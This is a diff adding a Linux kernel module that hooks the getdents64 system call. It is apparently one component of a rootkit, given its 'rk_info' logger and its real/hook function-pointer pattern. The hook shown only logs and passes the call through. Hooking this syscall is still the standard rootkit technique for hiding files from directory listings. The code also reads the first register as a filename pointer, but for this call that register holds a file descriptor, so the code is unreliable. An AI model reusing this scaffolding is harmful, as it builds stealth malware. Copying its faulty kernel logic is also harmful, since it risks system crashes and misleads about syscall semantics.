@@ -1,0 +1,40 @@
+#include <linux/module.h>
+#include <linux/slab.h>
+
+// ////////////////////////////////////////////////////////////////////
+// ////////////////////////////////////////////////////////////////////
+
+#include "../../logger/logger.h"
+#include "../utils.h"
+#include "getdents64.h"
+
+// ////////////////////////////////////////////////////////////////////
+// ////////////////////////////////////////////////////////////////////
+
+asmlinkage long (*real_getdents64)(const struct pt_regs *);
+
+// ////////////////////////////////////////////////////////////////////
+
+asmlinkage long hook_getdents64(const struct pt_regs *regs) {
+    char *kernel_filename = duplicate_filename((void *) regs->di);
+
+    rk_info("getdents64() hooked for: %s\n", kernel_filename);
+
+    kfree(kernel_filename);
+
+    const long ret = real_getdents64(regs);
+
+    rk_info("getdents64() true return: %ld\n", ret);
+
+    return ret;
+}
+
+// ////////////////////////////////////////////////////////////////////
+// ////////////////////////////////////////////////////////////////////
+
+EXPORT_SYMBOL(hook_getdents64);
+EXPORT_SYMBOL(real_getdents64);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Aspheric_");
+MODULE_DESCRIPTION("Hooks getdents64");
